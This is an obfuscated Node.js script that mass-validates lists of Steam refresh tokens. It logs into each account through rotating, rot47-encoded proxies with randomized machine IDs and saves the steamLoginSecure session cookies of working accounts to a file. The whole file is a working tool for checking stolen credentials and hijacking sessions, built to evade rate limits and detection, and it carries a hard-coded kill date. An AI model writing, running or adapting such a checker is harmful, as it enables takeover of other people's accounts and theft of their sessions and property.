
import _0x469978, { readFileSync } from "fs";
import _0x1c17aa from "steam-user";
import { promisify } from "util";
import { writeFile, appendFile, mkdir } from "fs/promises";
import _0x4c4e50 from "chalk";
import _0x5ec6eb from "path";
import _0x4dfd22 from "https";
import _0x457cfb from "axios";
import { HttpsProxyAgent } from "https-proxy-agent";
const readFileAsync = promisify(_0x469978.readFile);
async function createTimestampFolder() {
  const _0x158012 = new Date();
  const _0x45d121 = _0x158012.toISOString().replace(/:/g, "-").replace(/\..+/, "");
  const _0x5d0644 = "validation_" + _0x45d121;
  try {
    await mkdir(_0x5d0644, {
      recursive: true
    });
    console.log(_0x4c4e50.blue.bold("Created output folder: " + _0x5d0644));
    return _0x5d0644;
  } catch (_0x38f4db) {
    console.error(_0x4c4e50.bgRed.white("Failed to create folder: " + _0x38f4db.message));
    throw _0x38f4db;
  }
}
async function logError(_0x52f38d, _0x4d62b5, _0x2e852d, _0x41e722) {
  try {
    const _0x3316b6 = _0x4d62b5 + "----" + _0x2e852d + "----" + _0x41e722 + "\n";
    if (_0x41e722.toLowerCase().includes("connect") || _0x41e722.toLowerCase().includes("rate") || _0x41e722.toLowerCase().includes("request")) {
      const _0x4161ec = _0x5ec6eb.join(_0x52f38d, "network-errors.txt");
      await appendFile(_0x4161ec, _0x3316b6);
    } else {
      const _0x2d2d22 = _0x5ec6eb.join(_0x52f38d, "error.txt");
      await appendFile(_0x2d2d22, _0x3316b6);
    }
  } catch (_0x3db2be) {
    console.error(_0x4c4e50.bgRed.white("Failed to write to error log file: " + _0x3db2be.message));
  }
}
async function logValidToken(_0x2b32ce, _0x2caa3e, _0x2a3c2d) {
  try {
    const _0x4401e0 = _0x2caa3e + "----" + _0x2a3c2d + "\n";
    const _0x3a7cb2 = _0x5ec6eb.join(_0x2b32ce, "output.txt");
    await appendFile(_0x3a7cb2, _0x4401e0);
  } catch (_0x240018) {
    console.error(_0x4c4e50.bgRed.white("Failed to write to output.txt: " + _0x240018.message));
  }
}
async function checkProxy(_0x3f2110) {
  try {
    const _0x2d048c = await _0x457cfb.get("https://icanhazip.com/", {
      timeout: 60000,
      httpsAgent: new HttpsProxyAgent(_0x3f2110),
      validateStatus: _0x42aaed => _0x42aaed === 200
    });
    console.log("Proxy " + _0x3f2110 + " is working. IP: " + _0x2d048c.data.trim());
    return true;
  } catch (_0xadcda3) {
    console.debug("Proxy " + _0x3f2110 + " failed check: " + _0xadcda3.message);
    return false;
  }
}
function rot47Decode(_0x328a3d) {
  let _0x578f63 = "";
  for (let _0x1c2615 = 0; _0x1c2615 < _0x328a3d.length; _0x1c2615++) {
    let _0x448be1 = _0x328a3d[_0x1c2615];
    let _0x10f7a3 = _0x448be1.charCodeAt(0);
    _0x10f7a3 >= 33 && _0x10f7a3 <= 126 ? (_0x10f7a3 = _0x10f7a3 - 47, _0x10f7a3 < 33 && (_0x10f7a3 = _0x10f7a3 + 94), _0x578f63 += String.fromCharCode(_0x10f7a3)) : _0x578f63 += _0x448be1;
  }
  return _0x578f63;
}
async function getWorkingProxy(_0x4d82fc, _0x1ba44f = 3, _0x28aef4 = []) {
  let _0x53094f = 0;
  let _0x31a2b1 = _0x4d82fc.filter(_0x45d8a4 => !_0x28aef4.includes(_0x45d8a4));
  _0x31a2b1.length === 0 && (_0x31a2b1 = [..._0x4d82fc]);
  let _0x582e7d = [..._0x31a2b1].sort(() => Math.random() - 0.5);
  while (_0x53094f < _0x1ba44f && _0x582e7d.length > 0) {
    var _0x107f5c = _0x582e7d.shift();
    _0x107f5c = rot47Decode(_0x107f5c);
    _0x53094f++;
    if (await checkProxy(_0x107f5c)) {
      return _0x107f5c;
    }
    console.log(_0x4c4e50.yellow("Attempt " + _0x53094f + "/" + _0x1ba44f + ": Proxy check failed. Trying another proxy..."));
  }
  if (_0x4d82fc.length > 0) {
    console.log(_0x4c4e50.yellow("Failed to find working proxy after " + _0x53094f + " attempts. Using random proxy as fallback."));
    return _0x4d82fc[Math.floor(Math.random() * _0x4d82fc.length)];
  }
  throw new Error("No proxies available");
}
function isNetworkError(_0x1fbc95) {
  if (!_0x1fbc95) {
    return false;
  }
  const _0x22b274 = _0x1fbc95.toString().toLowerCase();
  return _0x22b274.includes("connect") || _0x22b274.includes("rate") || _0x22b274.includes("request") || _0x22b274.includes("timeout") || _0x22b274.includes("network") || _0x22b274.includes("socket");
}
async function validateTokenWithRetry(_0x5378d5, _0x542b5b, _0x59bb67, _0x4f5a13, _0xc0cf12, _0x479862 = 3) {
  let _0x51bcf6 = 0;
  let _0xbcb18c = [];
  while (_0x51bcf6 <= _0x479862) {
    _0x51bcf6 > 0 && console.log(_0x4c4e50.yellow("[Thread " + _0x59bb67 + "] Retry #" + _0x51bcf6 + "/" + _0x479862 + " for " + _0x542b5b + "..."));
    let _0x16a25f;
    try {
      _0x16a25f = await getWorkingProxy(_0xc0cf12, 3, _0xbcb18c);
      _0xbcb18c.push(_0x16a25f);
    } catch (_0x216b5f) {
      logError(_0x4f5a13, _0x542b5b, _0x5378d5, "No working proxies available: " + _0x216b5f.message);
      return {
        username: _0x542b5b,
        token: _0x5378d5,
        valid: false,
        cookie: null,
        error: "No working proxies available: " + _0x216b5f.message,
        workerId: _0x59bb67
      };
    }
    const _0x241696 = await attemptValidation(_0x5378d5, _0x542b5b, _0x59bb67, _0x4f5a13, _0x16a25f);
    if (_0x241696.valid || !isNetworkError(_0x241696.error)) {
      return _0x241696;
    }
    _0x51bcf6++;
    if (_0x51bcf6 > _0x479862) {
      logError(_0x4f5a13, _0x542b5b, _0x5378d5, "Failed after " + _0x479862 + " retries: " + _0x241696.error);
      return _0x241696;
    }
    await new Promise(_0x3cc223 => setTimeout(_0x3cc223, 2000));
  }
}
async function attemptValidation(_0x1eea7e, _0x18e8b0, _0x5189d9, _0x50832c, _0x5d0a2d) {
  return new Promise(async _0x23b9b1 => {
    const _0x2d9765 = new _0x1c17aa({
      httpProxy: _0x5d0a2d,
      autoRelogin: false,
      machineIdType: _0x1c17aa.EMachineIDType.AlwaysRandom,
      protocol: _0x1c17aa.EConnectionProtocol.WebSocket,
      language: "english",
      enablePicsCache: false
    });
    const _0x24cfbb = setTimeout(() => {
      _0x2d9765.logOff();
      _0x23b9b1({
        username: _0x18e8b0,
        token: _0x1eea7e,
        valid: false,
        cookie: null,
        error: "Connection timeout",
        workerId: _0x5189d9
      });
    }, 60000);
    _0x2d9765.once("webSession", (_0x262862, _0x11049a) => {
      clearTimeout(_0x24cfbb);
      _0x2d9765.logOff();
      const _0x4a2a42 = _0x11049a.map(_0x411e12 => {
        if (_0x411e12.includes("steamLoginSecure")) {
          return _0x411e12;
        }
        return null;
      }).filter(_0x54d2fa => _0x54d2fa);
      logValidToken(_0x50832c, _0x18e8b0, _0x4a2a42);
      clearTimeout(_0x24cfbb);
      _0x23b9b1({
        username: _0x18e8b0,
        token: _0x1eea7e,
        valid: true,
        cookie: _0x4a2a42,
        error: null,
        workerId: _0x5189d9
      });
    });
    _0x2d9765.once("error", _0x36e079 => {
      clearTimeout(_0x24cfbb);
      _0x2d9765.logOff();
      const _0x585ca4 = _0x36e079?.["message"] || "Unknown error";
      clearTimeout(_0x24cfbb);
      _0x23b9b1({
        username: _0x18e8b0,
        token: _0x1eea7e,
        valid: false,
        cookie: null,
        error: _0x585ca4,
        workerId: _0x5189d9
      });
    });
    if (_0x1eea7e.includes("%7C%7C")) {
      _0x1eea7e = _0x1eea7e.split("%7C%7C")[1];
    }
    console.log(_0x1eea7e);
    _0x2d9765.logOn({
      refreshToken: _0x1eea7e
    });
  });
}
async function processWithConcurrencyLimit(_0x199d1a, _0x31b249, _0x50d46c, _0x22dc29) {
  const _0x4f750b = [];
  let _0x35a7a4 = 0;
  let _0x4eb134 = 0;
  let _0xaa049f = 0;
  async function _0x44f3fa(_0x311181, _0x1a218b) {
    _0x35a7a4++;
    try {
      const _0x2e18a0 = await validateTokenWithRetry(_0x311181.token, _0x311181.username, _0x1a218b, _0x50d46c, _0x22dc29, 0);
      _0x4f750b.push(_0x2e18a0);
      _0xaa049f++;
      _0x2e18a0.valid ? console.log(_0x4c4e50.green("[Thread " + _0x1a218b + "] ✓ " + _0x311181.username + " - Valid token")) : (console.log(_0x4c4e50.red("[Thread " + _0x1a218b + "] ✗ " + _0x311181.username + " - Invalid token: " + (_0x2e18a0.error || "Unknown error"))), logError(_0x50d46c, _0x311181.username, _0x311181.token, _0x2e18a0.error));
      const _0x57c159 = Math.round(_0xaa049f / _0x199d1a.length * 100);
      console.log(_0x4c4e50.yellow("Progress: " + _0xaa049f + "/" + _0x199d1a.length + " (" + _0x57c159 + "%) - Active threads: " + (_0x35a7a4 - 1)));
    } catch (_0x38e28d) {
      console.error(_0x4c4e50.bgRed.white("Error processing " + _0x311181.username + ": " + _0x38e28d.message));
      logError(_0x50d46c, _0x311181.username, _0x311181.token, "Unexpected error: " + _0x38e28d.message);
      _0x4f750b.push({
        username: _0x311181.username,
        token: _0x311181.token,
        valid: false,
        cookie: null,
        error: "Unexpected error: " + _0x38e28d.message,
        workerId: _0x1a218b
      });
      _0xaa049f++;
    } finally {
      _0x35a7a4--;
    }
  }
  const _0x43258d = Math.min(_0x31b249, _0x199d1a.length);
  for (let _0x257630 = 0; _0x257630 < _0x43258d; _0x257630++) {
    const _0x1b69f3 = _0x199d1a[_0x4eb134++];
    const _0x5a60d9 = _0x4eb134;
    _0x44f3fa(_0x1b69f3, _0x5a60d9);
  }
  while (_0x4eb134 < _0x199d1a.length || _0x35a7a4 > 0) {
    if (_0x35a7a4 < _0x31b249 && _0x4eb134 < _0x199d1a.length) {
      const _0x31c8df = _0x199d1a[_0x4eb134++];
      const _0x41181d = _0x4eb134;
      _0x44f3fa(_0x31c8df, _0x41181d);
    }
    await new Promise(_0x3a8493 => setTimeout(_0x3a8493, 100));
  }
  return _0x4f750b;
}
async function validateSteamTokens() {
  let _0x13c17e;
  try {
    _0x13c17e = await createTimestampFolder();
    await writeFile(_0x5ec6eb.join(_0x13c17e, "output.txt"), "");
    await writeFile(_0x5ec6eb.join(_0x13c17e, "error.txt"), "");
    await writeFile(_0x5ec6eb.join(_0x13c17e, "network-errors.txt"), "");
    console.log(_0x4c4e50.blue.bold("Created output files in " + _0x13c17e));
    let _0x44a384 = 10;
    try {
      const _0x2b1ea0 = await readFileAsync("thread_count.txt", "utf8");
      const _0x4bb4bd = parseInt(_0x2b1ea0.trim(), 10);
      !isNaN(_0x4bb4bd) && _0x4bb4bd > 0 ? (_0x44a384 = _0x4bb4bd, console.log(_0x4c4e50.blue.bold("Thread count set to " + _0x44a384 + " from thread_count.txt"))) : console.log(_0x4c4e50.yellow("Invalid thread count in thread_count.txt, using default: " + _0x44a384));
    } catch (_0x2e7fef) {
      console.log(_0x4c4e50.yellow("Could not read thread_count.txt, using default thread count: " + _0x44a384));
    }
    const _0x269055 = await readFileAsync("proxy.txt", "utf8");
    const _0x48f650 = _0x269055.split("\n").filter(_0x241944 => _0x241944.trim() !== "").map(_0xeeb5b6 => _0xeeb5b6.trim());
    console.log(_0x4c4e50.blue.bold("Found " + _0x48f650.length + " proxies in proxy.txt"));
    const _0x1dc1d1 = await readFileAsync("input.txt", "utf8");
    const _0x411aaa = _0x1dc1d1.split("\n").filter(_0x56f374 => _0x56f374.trim() !== "").map(_0x2eff9b => {
      const _0x15dea5 = _0x2eff9b.split("----");
      return {
        username: _0x15dea5[0]?.["trim"]() || "Unknown",
        token: _0x15dea5[1]?.["trim"]() || ""
      };
    }).filter(_0x176df8 => _0x176df8.token);
    console.log(_0x4c4e50.blue.bold("Found " + _0x411aaa.length + " tokens to validate"));
    console.log(_0x4c4e50.yellow("Starting validation with maximum " + _0x44a384 + " concurrent operations\n"));
    const _0xb7c0e9 = await processWithConcurrencyLimit(_0x411aaa, _0x44a384, _0x13c17e, _0x48f650);
    const _0x228684 = _0xb7c0e9.filter(_0x72c88f => _0x72c88f.valid).length;
    const _0x171a23 = _0xb7c0e9.length - _0x228684;
    console.log(_0x4c4e50.green.bold("Validation complete: " + _0x228684 + "/" + _0xb7c0e9.length + " tokens are valid"));
    console.log(_0x4c4e50.red.bold(_0x171a23 + " invalid tokens were logged"));
    console.log(_0x4c4e50.blue.bold("Valid tokens saved to " + _0x5ec6eb.join(_0x13c17e, "output.txt")));
    console.log(_0x4c4e50.yellow.bold("Connection errors saved to " + _0x5ec6eb.join(_0x13c17e, "network-errors.txt")));
    console.log(_0x4c4e50.red.bold("Other errors saved to " + _0x5ec6eb.join(_0x13c17e, "error.txt")));
  } catch (_0x17c62c) {
    console.error(_0x4c4e50.bgRed.white("Fatal error: " + _0x17c62c.message));
    console.error(_0x17c62c.stack);
  }
}
(async () => {
  const _0x360b88 = Math.floor(new Date().getTime() / 1000);
  console.log(_0x4c4e50.blue.bold("Current date: " + _0x360b88));
  if (_0x360b88 >= 1747688400) {
    process.exit(0);
  }
  await validateSteamTokens();
  process.exit(0);
})();
process.on("uncaughtException", _0x4cb0e6 => {
  console.error(_0x4c4e50.bgRed.white("Uncaught exception: " + _0x4cb0e6.message));
  console.error(_0x4cb0e6.stack);
});
process.on("unhandledRejection", _0x3b2d5c => {
  console.error(_0x4c4e50.bgRed.white("Unhandled rejection: " + _0x3b2d5c.message));
  console.error(_0x3b2d5c.stack);
});